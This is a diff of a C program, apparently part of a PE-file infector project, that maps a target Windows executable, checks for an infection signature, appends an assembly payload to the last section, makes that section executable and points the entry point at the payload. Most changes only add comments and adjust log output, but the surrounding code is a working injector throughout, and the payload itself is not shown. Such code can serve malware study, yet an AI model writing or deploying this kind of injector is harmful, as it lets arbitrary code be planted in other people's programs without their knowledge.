@@ -4,16 +4,17 @@
 #include "payload.h"
 #include "utils.h"
 
+// Extern declarations for the ASM payload (found in payload_{begin,end}.asm)
 EXTERN_C_START
-extern CONST BYTE __payload_start;
-extern CONST VOID payload();
-extern LONGLONG delta_start;
-extern LONGLONG to_c_code;
-extern DWORD code_size;
-extern CONST BYTE __payload_end;
+extern CONST BYTE __payload_start;  // Start of the payload
+extern CONST BYTE __payload_end;    // End of the payload
+extern CONST VOID payload();        // Payload entry point
+extern LONGLONG delta_start;        // Delta between original and new entry points
+extern LONGLONG to_c_code;          // Offset from the payload to the C payload code (inj_code_c)
+extern DWORD code_size;             // Size of the payload code
 #ifndef SKIP_SIGN
-extern CONST DWORD signature;
-#endif
+extern CONST DWORD signature;  // Signature to check if the payload is already injected
+#endif                         // SKIP_SIGN
 EXTERN_C_END
 
 int main(int argc, char* argv[]) {
@@ -24,6 +25,7 @@ int main(int argc, char* argv[]) {
         dwLastSectionSize, dwLastSectionRva, dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint,
         dwOldProtect;
     ULARGE_INTEGER uliSize;
+    // RO: read-only, RW: read-write
     PCIMAGE_DOS_HEADER pDosHeaderRO;
     PCIMAGE_NT_HEADERS64 pNtHeaderRO;
     PCIMAGE_SECTION_HEADER pSectionRO, pLastSectionRO;
@@ -33,20 +35,19 @@ int main(int argc, char* argv[]) {
     WORD wNbSections;
 #ifndef SKIP_SIGN
     DWORD dwSignature;
-#endif
+#endif  // SKIP_SIGN
 
     CONST DWORD dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
     printf("Payload size: %lu\n", dwPayloadSize);
-    printf("Payload: %p\n", &__payload_start);
     // HexDump((PCBYTE)&__payload_start, dwPayloadSize);
 
     if (argc < 2) {
-        fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <target.exe>\n", argv[0]);
         ret = 1;
         goto exit;
     }
 
-    printf("Reading file: %s\n", argv[1]);
+    printf("[*] Reading file: %s\n", argv[1]);
 
     hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);
@@ -59,6 +60,9 @@ int main(int argc, char* argv[]) {
     dwFileSize = GetFileSize(hFile, NULL);
     printf("File size: %lu bytes\n", dwFileSize);
     LIQUAD(uliSize) = dwFileSize;
+
+    // First, map the file in read-only mode to check if it's a valid PE file, and get some
+    // information about it (eg. alignment, to remap it in read-write mode later on)
 
     hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READONLY, LIHILO(uliSize), NULL);
     if (hMapFile == NULL) {
@@ -102,9 +106,10 @@ int main(int argc, char* argv[]) {
     dwLastSectionRva = pLastSectionRO->VirtualAddress;
     dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
     dwOrigEntryPoint = pNtHeaderRO->OptionalHeader.AddressOfEntryPoint;
-    printf("Entry point: %#010lx\n", dwOrigEntryPoint);
+    printf("Entry point:       %#010lx\n", dwOrigEntryPoint);
+    printf("Nb. of sections:   %hu\n", wNbSections);
     printf("Last section name: %s\n", pLastSectionRO->Name);
-    printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
+    printf("Last section ptr:  %#010lx\n", dwLastSectionPtr);
     printf("Old raw size:      %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
     printf("Old virtsize:      %#lx (%lu)\n", pLastSectionRO->Misc.VirtualSize,
            pLastSectionRO->Misc.VirtualSize);
@@ -112,6 +117,8 @@ int main(int argc, char* argv[]) {
     printf("Old size of image: %lu\n", pNtHeaderRO->OptionalHeader.SizeOfImage);
 
 #ifndef SKIP_SIGN
+    // Check if the payload is already injected by looking for the signature
+    // right before the entry point, if it's inside the last section
     if (dwOrigEntryPoint >= dwLastSectionRva &&
         dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
         dwSignature = *(PCDWORD)((PCBYTE)pDosHeaderRO + dwLastSectionPtr +
@@ -125,14 +132,13 @@ int main(int argc, char* argv[]) {
             goto unmap;
         }
     }
-#endif
+#endif  // SKIP_SIGN
 
-    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
-    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
-
+    // Unmap the file to remap it in read-write mode
     UnmapViewOfFile(pMapAddress);
     CloseHandle(hMapFile);
 
+    // Make code_size and to_c_code writable to update their values
     VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
     code_size = dwPayloadSize;
     VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);
@@ -141,8 +147,15 @@ int main(int argc, char* argv[]) {
     to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
     VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);
 
+    // Section raw data must be aligned to FileAlignment
+    // Since the original section is assumed to be aligned, we just need to align the payload
+    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
+    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
+
+    // Make sure the final file size is aligned
     LIQUAD(uliSize) = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);
 
+    // Remap the file in read-write mode to inject the payload and update the headers
     hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, LIHILO(uliSize), NULL);
     if (hMapFile == NULL) {
         PrintError("CreateFileMappingA");
@@ -166,11 +179,15 @@ int main(int argc, char* argv[]) {
 
     pLastSectionRW->Misc.VirtualSize = pLastSectionRW->SizeOfRawData + dwPayloadSize;
     pLastSectionRW->SizeOfRawData += dwSizeAligned;
+    // If the last section is already code, only add the (aligned) new payload size to SizeOfCode
+    // Otherwise, add the whole section size since we're going to mark it as code anyway
     pNtHeaderRW->OptionalHeader.SizeOfCode += pLastSectionRW->Characteristics & IMAGE_SCN_CNT_CODE
                                                   ? dwSizeAligned
                                                   : pLastSectionRW->SizeOfRawData;
+    // SizeOfImage must be aligned to SectionAlignment
     pNtHeaderRW->OptionalHeader.SizeOfImage =
         ALIGN(dwLastSectionRva + pLastSectionRW->Misc.VirtualSize, dwSectionAlignment);
+    // Make the last section executable, and mark it as code and not discardable
     pLastSectionRW->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
     pLastSectionRW->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
     printf("New raw size:      %#lx (%lu)\n", pLastSectionRW->SizeOfRawData,
@@ -190,6 +207,7 @@ int main(int argc, char* argv[]) {
     VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
     printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);
 
+    // Payload is ready to be injected
     printf("New payload:\n");
     HexDump(&__payload_start, dwPayloadSize);
 
